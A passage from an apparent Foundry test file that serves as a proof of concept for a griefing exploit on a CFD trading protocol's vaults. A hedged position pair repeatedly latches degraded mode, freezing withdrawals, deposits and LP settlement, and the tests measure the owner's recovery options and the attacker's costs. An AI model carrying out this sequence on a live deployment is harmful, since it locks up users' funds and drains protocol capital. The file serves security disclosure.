        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(carolReqId, CAROL, CAROL);
        console2.log("CAROL pending deposit still escrowed after 24h", juniorVault.pendingDepositRequest(carolReqId, CAROL));
        console2.log("CAROL wallet USDG", settlementToken.balanceOf(CAROL));
        assertEq(juniorVault.pendingDepositRequest(carolReqId, CAROL), CAROL_DEPOSIT, "deposit still pending");
        assertEq(settlementToken.balanceOf(CAROL), 0, "CAROL cannot get her USDG back");
        assertEq(juniorVault.balanceOf(CAROL), 0, "CAROL holds no shares");

        // (3) The honest trader's free settlement cannot be withdrawn while the position is open.
        uint256 honestFree = clearinghouse.balanceAssets(HONEST_TRADER);
        console2.log("honest trader free settlement (withdrawable at launch rules before the latch)", honestFree);
        vm.prank(HONEST_TRADER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(HONEST_TRADER, 1e6);
        assertEq(clearinghouse.balanceAssets(HONEST_TRADER), honestFree, "free settlement unchanged and stuck");
        assertGt(_posSize(HONEST_TRADER), 0, "honest trader still holds its position");

        // (4) The owner cannot simply clear it: the same pair keeps L pinned.
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();
        console2.log("minimum owner recap to clear (L - E)", _minRecapToClear());
        console2.log("attacker hedged notional per leg N", hedgedNotional);
    }

    // ------------------------------------------------------------------
    // Test 3: the only ordinary exit of an honest trader is to close, which is allowed
    // ------------------------------------------------------------------

    function test_honestTraderCanExitByClosingThePosition() public {
        _setupHedgedPair();
        _moveAndLatch();
        uint256 walletBefore = settlementToken.balanceOf(HONEST_TRADER);
        uint256 freeBefore = clearinghouse.balanceAssets(HONEST_TRADER);
        bool closed = _routerTrade(HONEST_TRADER, CfdTypes.Side.LONG, _posSize(HONEST_TRADER), 0, true, MOVE_1_PCT);
        assertTrue(closed, "the honest trader can close while degraded");
        uint256 freeAfter = clearinghouse.balanceAssets(HONEST_TRADER);
        console2.log("honest free settlement before / after closing", freeBefore, freeAfter);
        vm.prank(HONEST_TRADER);
        clearinghouse.withdraw(HONEST_TRADER, freeAfter);
        console2.log("honest wallet USDG before / after withdraw", walletBefore, settlementToken.balanceOf(HONEST_TRADER));
        assertEq(settlementToken.balanceOf(HONEST_TRADER), walletBefore + freeAfter, "funds recovered after closing");
        assertTrue(engine.degradedMode(), "still latched for everyone else");
    }

    // ------------------------------------------------------------------
    // Test 4: owner response A, the documented runbook as separate transactions
    // ------------------------------------------------------------------

    function test_ownerRunbookMinimumRecapThenClear_attackerRelatches() public {
        _setupHedgedPair();
        uint256 slice1Payout = _moveAndLatch();

        uint256 minRecap = _minRecapToClear();
        uint256 recap = minRecap + 1e6;
        console2.log("owner recap (L - E + 1 USDG)", recap);
        console2.log("  compared with the slice-1 payout X", slice1Payout);
        _ownerRecap(recap);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner cleared degraded mode");

        // The attacker back-runs the clear with slice 2, the second winning slice.
        uint256 p1 = pool.totalAssets();
        assertTrue(
            _routerTrade(ATK_S2, CfdTypes.Side.SHORT, _posSize(ATK_S2), 0, true, MOVE_1_PCT), "slice-2 close fills"
        );
        uint256 x2 = p1 - pool.totalAssets();
        console2.log("slice-2 payout X2", x2);
        assertTrue(engine.degradedMode(), "latched again right after the owner's clear");
        console2.log("owner cumulative recap so far", recap);

        vm.warp(vm.getBlockTimestamp() + 1 hours);
        (bool ok, bytes4 sel) = _settleOnce();
        assertFalse(ok);
        assertEq(sel, IHousePool.HousePool__DegradedMode.selector, "settlement frozen again");
        console2.log("minimum recap needed to clear the second latch", _minRecapToClear());
    }

    // ------------------------------------------------------------------
    // Test 5: owner response B, documented runbook with a generous recap (separate transactions)
    // ------------------------------------------------------------------

    function test_ownerRunbookGenerousRecapThenClear_withoutAssignStep() public {
        _setupHedgedPair();
        _moveAndLatch();

        uint256 remaining = _remainingShortProfit();
        console2.log("profit still realizable on the remaining winning leg", remaining);
        uint256 recap = _minRecapToClear() + remaining + 100e6;
        console2.log("owner generous recap (L - E + remaining profit + 100)", recap);
        _ownerRecap(recap);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "cleared");

        // Attacker tries hardest: close the entire second slice. It cannot re-latch without a new price move.
        uint256 p1 = pool.totalAssets();
        assertTrue(
            _routerTrade(ATK_S2, CfdTypes.Side.SHORT, _posSize(ATK_S2), 0, true, MOVE_1_PCT), "slice-2 close fills"
        );
        console2.log("attacker slice-2 payout", p1 - pool.totalAssets());
        assertFalse(engine.degradedMode(), "no re-latch at this price");

        // Traders can withdraw again.
        vm.prank(HONEST_TRADER);
        clearinghouse.withdraw(HONEST_TRADER, 1e6);

        // Continue with the documented runbook only: settle. No assignUnassignedAssets.
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _refreshMark(MOVE_1_PCT);
        (bool ok, bytes4 sel) = _settleOnce();
        console2.log("settleLpEpoch after recap+clear ok?", ok);
        if (!ok) console2.logBytes4(sel);
        console2.log("LP redemptions funded", _fundedLp());
        console2.log("pool unassignedAssets", pool.unassignedAssets());
        console2.log("pool pendingRecapitalizationAssets", pool.getPoolLiquidityView().pendingRecapitalizationAssets);
        console2.log("CAROL still pending deposit", juniorVault.pendingDepositRequest(carolReqId, CAROL));
        console2.log("CAROL shares", juniorVault.balanceOf(CAROL));
        console2.log("CAROL claimable deposit shares", juniorVault.claimableDepositShares(carolReqId, CAROL));

        // Now the extra step the runbook omits.
        _refreshMark(MOVE_1_PCT);
        pool.assignUnassignedAssets(false, address(this));
        console2.log("owner Junior shares after assignUnassignedAssets", juniorVault.balanceOf(address(this)));
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        (ok, sel) = _settleOnce();
        console2.log("settleLpEpoch after assignUnassignedAssets ok?", ok);
        console2.log("LP redemptions funded", _fundedLp());
        console2.log("CAROL claimable deposit shares", juniorVault.claimableDepositShares(carolReqId, CAROL));
        console2.log("CAROL still pending deposit", juniorVault.pendingDepositRequest(carolReqId, CAROL));
    }

    // ------------------------------------------------------------------
    // Test 6: owner response C, the atomic bundle
    // ------------------------------------------------------------------

    function test_ownerAtomicBundleRecapClearAssignSettle() public {
        _setupHedgedPair();
        _moveAndLatch();

        uint256 requested = JUNIOR_ASSETS + SENIOR_ASSETS;
        uint256 recap = _minRecapToClear() + requested + 10_000e6;
        console2.log("owner recap in the bundle (covers all queued redemptions)", recap);
        // One transaction (single Safe MultiSend): the attacker cannot interleave.
        _ownerRecap(recap);
        engine.clearDegradedMode();
        _refreshMark(MOVE_1_PCT);
        pool.assignUnassignedAssets(false, address(this));
        uint256 ownerShares = juniorVault.balanceOf(address(this));
        (bool ok, bytes4 sel) = _settleOnce();
        console2.log("bundle settle ok?", ok);
        if (!ok) console2.logBytes4(sel);
        console2.log("owner Junior shares received for the recap", ownerShares);
        console2.log("LP redemptions funded by the bundle", _fundedLp());
        console2.log("  requested", requested);
        console2.log("CAROL claimable deposit shares", juniorVault.claimableDepositShares(carolReqId, CAROL));
        console2.log("CAROL pending deposit", juniorVault.pendingDepositRequest(carolReqId, CAROL));
        console2.log("owner share value (convertToAssets)", juniorVault.convertToAssets(ownerShares));
        assertTrue(ok, "bundle settles");
        assertGt(_fundedLp(), (requested * 95) / 100, "queued redemptions funded");
        assertFalse(engine.degradedMode(), "not degraded after the bundle");

        // The owner now holds the Junior shares. The hedged pair is still open and again pins L, so check what the
        // owner can get out: request redemption of every owner share after the cooldown and settle.
        console2.log("after the bundle: E", _equityE());
        console2.log("after the bundle: L", _maxLiability());
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _refreshMark(MOVE_1_PCT);
        uint256 shares = juniorVault.maxRequestRedeem(address(this));
        uint256 ownerReq = juniorVault.requestRedeem(shares, address(this), address(this));
        _warpToEpochStart(ownerReq);
        _refreshMark(MOVE_1_PCT);
        (ok,) = _settleOnce();
        console2.log("owner redemption settle ok?", ok);
        console2.log("owner redemption funded (USDG)", juniorVault.claimableRedeemAssets(ownerReq, address(this)));
        console2.log("owner recap paid (USDG)", recap);
    }

    // ------------------------------------------------------------------
    // Test 6b: cheaper atomic bundle (durable clear + assign + settle, no redemption funding)
    // ------------------------------------------------------------------

    function test_ownerCheapAtomicBundleRestoresEverythingExceptRedemptions() public {
        _setupHedgedPair();
        _moveAndLatch();
        uint256 recap = _minRecapToClear() + _remainingShortProfit() + 100e6;
        console2.log("owner recap (L - E + remaining profit + 100)", recap);
        _ownerRecap(recap);
        engine.clearDegradedMode();
        _refreshMark(MOVE_1_PCT);
        pool.assignUnassignedAssets(false, address(this));
        (bool ok,) = _settleOnce();
        assertTrue(ok, "settle succeeds");
        assertFalse(engine.degradedMode());
        console2.log("CAROL claimable deposit shares", juniorVault.claimableDepositShares(carolReqId, CAROL));
        console2.log("CAROL pending deposit", juniorVault.pendingDepositRequest(carolReqId, CAROL));
        console2.log("queued LP redemptions funded (USDG)", _fundedLp());
        assertGt(juniorVault.claimableDepositShares(carolReqId, CAROL), 0, "deposit activated");
        vm.prank(HONEST_TRADER);
        clearinghouse.withdraw(HONEST_TRADER, 1e6);
        assertLe(_fundedLp(), DUST + recap, "LP redemptions remain essentially unfunded");
    }

    // ------------------------------------------------------------------
    // Test 7: waiting and pausing do not end it
    // ------------------------------------------------------------------

    function test_waitingAndPausingDoNotClearTheLatch() public {
        _setupHedgedPair();
        _moveAndLatch();
        for (uint256 h; h < 7 * 24; ++h) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            (bool ok, bytes4 sel) = _settleOnce();
            assertFalse(ok);
            if (!engine.isOracleFrozen()) assertEq(sel, IHousePool.HousePool__DegradedMode.selector);
        }
        assertTrue(engine.degradedMode(), "still latched after 7 days");
        assertGt(_posSize(ATK_L), 0, "the LONG leg that pins L is still open");
        assertGt(_maxLiability(), _equityE(), "L still exceeds E after 7 days");
        console2.log("after 7 days: L", _maxLiability());
        console2.log("after 7 days: E", _equityE());
        (uint256 owedL) = engine.sideCarryIndex(0);
        console2.log("LONG-side carry index (unchanged means zero carry)", owedL);
        routerAdmin.pause();
        assertTrue(engine.degradedMode(), "pausing the router does not clear the latch");
    }

    // ------------------------------------------------------------------
    // Test 8: attacker cost of the whole sequence
    // ------------------------------------------------------------------

    function test_attackerNetCostOfTheWholeSequence() public {
        _setupHedgedPair();
        _moveAndLatch();
        _ownerRecap(_minRecapToClear() + _remainingShortProfit() + 100e6 + 1_000_000e6);
        engine.clearDegradedMode();
        _unwind(((_equityE() * CHUNK_BPS) / 10_000) / LOT * LOT, MOVE_1_PCT);
        assertEq(_posSize(ATK_L) + _posSize(ATK_S1) + _posSize(ATK_S2), 0, "attacker fully exited");
        uint256 end = _attackerBalance();
        console2.log("attacker deposits", attackerDeposits);
        console2.log("attacker final balance", end);
        if (attackerDeposits >= end) {
            console2.log("attacker net cost (USDG)", attackerDeposits - end);
            console2.log("hedged notional per leg N", hedgedNotional);
            console2.log("net cost per 1e6 of N", ((attackerDeposits - end) * 1_000_000) / hedgedNotional);
        } else {
            console2.log("attacker net GAIN (USDG)", end - attackerDeposits);
        }
    }

    // ------------------------------------------------------------------
    // Test 9: control, the same pair opened and closed with no price move
    // ------------------------------------------------------------------

    function test_attackerCostWithoutPriceMove() public {
        _setupHedgedPair();
        _unwind(((_equityE() * CHUNK_BPS) / 10_000) / LOT * LOT, ENTRY);
        uint256 end = _attackerBalance();
        console2.log("attacker deposits", attackerDeposits);
        console2.log("attacker final balance", end);
        console2.log("attacker cost with no price move (USDG)", attackerDeposits - end);
    }

    // ------------------------------------------------------------------
    // Test 10: documented runbook only (recap + clear), then repeated permissionless settlement over many epochs
    // ------------------------------------------------------------------

    function test_runbookOnly_repeatedSettlementOverManyEpochs() public {
        _setupHedgedPair();
        _moveAndLatch();
        uint256 recap = _minRecapToClear() + _remainingShortProfit() + 100e6;
        _ownerRecap(recap);
        engine.clearDegradedMode(); // SECURITY.md runbook: recapitalize, then clear
        assertFalse(engine.degradedMode());

        uint256 ok;
        uint256 noProgress;
        uint256 other;
        for (uint256 h; h < 72; ++h) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            _refreshMark(MOVE_1_PCT);
            (bool s, bytes4 sel) = _settleOnce();
            if (s) ok++;
            else if (sel == IHousePool.HousePool__NoLpEpochProgress.selector) noProgress++;
            else other++;
        }
        console2.log("hourly settle calls over 72h after recap+clear: ok", ok);
        console2.log("   reverted NoLpEpochProgress", noProgress);
        console2.log("   reverted other", other);
        console2.log("pendingRecapitalizationAssets after 72h", pool.getPoolLiquidityView().pendingRecapitalizationAssets);
        console2.log("CAROL pending deposit after 72h", juniorVault.pendingDepositRequest(carolReqId, CAROL));
        console2.log("CAROL shares after 72h", juniorVault.balanceOf(CAROL));
        console2.log("LP redemptions funded after 72h", _fundedLp());
        // Report outcome without presupposing it; the assertions below record what is measured.
        assertEq(ok + noProgress + other, 72);
        // Carol's pending deposit: cancel attempt after the clear
        vm.prank(CAROL);
        try juniorVault.cancelPendingDeposit(carolReqId, CAROL, CAROL) {
            console2.log("CAROL cancel after clear: succeeded");
        } catch (bytes memory err) {
            console2.log("CAROL cancel after clear reverted, selector:");
            console2.logBytes4(_sel(err));
        }
        // The step the runbook omits (first move to a live-market hour).
        _warpToLiveMarket();
        _refreshMark(MOVE_1_PCT);
        pool.assignUnassignedAssets(false, address(this));
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        (bool s2,) = _settleOnce();
        console2.log("settle after assignUnassignedAssets ok?", s2);
        console2.log("CAROL claimable deposit shares", juniorVault.claimableDepositShares(carolReqId, CAROL));
    }

    // ------------------------------------------------------------------
    // Test 11: multi-cycle loop, owner recapitalizes the minimum and clears, attacker re-latches, repeat.
    // The price alternates between +1% and 0%; the attacker closes small slices of whichever leg is winning.
    // ------------------------------------------------------------------

    /// @dev Close `step`-sized slices of the winning leg until the engine latches or the budget ends.
    function _relatchWithSlices(
        bool shortsWin,
        uint256 price
    ) internal returns (uint256 drained, bool latched) {
        uint256 step = 5 * LOT * 1e12;
        for (uint256 i; i < 120 && !engine.degradedMode(); ++i) {
            address acct;
            CfdTypes.Side side;
            if (shortsWin) {
                side = CfdTypes.Side.SHORT;
                acct = _posSize(ATK_S2) > 0 ? ATK_S2 : ATK_S1;
            } else {
                side = CfdTypes.Side.LONG;
                acct = ATK_L;
            }
            uint256 have = _posSize(acct);
            if (have == 0) break;
            uint256 sz = have < step ? have : step;
            uint256 p0 = pool.totalAssets();
            if (!_routerTrade(acct, side, sz, 0, true, price)) break;
            uint256 p1 = pool.totalAssets();
            if (p0 > p1) drained += p0 - p1;
        }
        latched = engine.degradedMode();
    }

    function test_multiCycleClearRelatchLoop() public {
        _setupHedgedPair();
        _moveAndLatch();
        uint256 ownerTotal;
        uint256 attackerPayouts;
        uint256 cycles;
        uint256 price = MOVE_1_PCT;
        uint256 honestFree = clearinghouse.balanceAssets(HONEST_TRADER);
        for (uint256 i; i < 25; ++i) {
            // frozen state asserted at the start of every cycle
            assertTrue(engine.degradedMode(), "latched at cycle start");
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            (bool sOk, bytes4 sel) = _settleOnce();
            assertFalse(sOk);
            assertEq(sel, IHousePool.HousePool__DegradedMode.selector);
            vm.prank(HONEST_TRADER);
            vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
            clearinghouse.withdraw(HONEST_TRADER, 1e6);
            assertEq(clearinghouse.balanceAssets(HONEST_TRADER), honestFree, "honest balance unchanged");
            assertEq(juniorVault.pendingDepositRequest(carolReqId, CAROL), CAROL_DEPOSIT, "CAROL escrow unchanged");

            // documented runbook: minimum recap + 1 USDG slack, then clear
            uint256 recap = _minRecapToClear() + 1e6;
            _ownerRecap(recap);
            ownerTotal += recap;
            engine.clearDegradedMode();
            assertFalse(engine.degradedMode(), "cleared");

            // attacker slices the winning SHORT; if banked profit at this price is spent, the basket rises 0.25%
            _refreshMark(price);
            (uint256 drained, bool relatched) = _relatchWithSlices(true, price);
            if (!relatched) {
                price += 0.0025e8;
                _refreshMark(price);
                (uint256 d2, bool r2) = _relatchWithSlices(true, price);
                drained += d2;
                relatched = r2;
            }
            attackerPayouts += drained;
            console2.log("---- cycle", i);
            console2.log("   mark (1e8)", price);
            console2.log("   owner recap", recap);
            console2.log("   attacker slice payouts", drained);
            console2.log("   re-latched?", relatched);
            if (!relatched) break;
            cycles++;
        }
        console2.log("completed clear -> re-latch cycles", cycles);
        console2.log("owner cumulative recap", ownerTotal);
        console2.log("attacker cumulative slice payouts", attackerPayouts);
        console2.log("degraded at end?", engine.degradedMode());
        console2.log("short size left S2", _posSize(ATK_S2));
        assertGe(cycles, 5, "at least five clear -> re-latch cycles");
    }

}
```

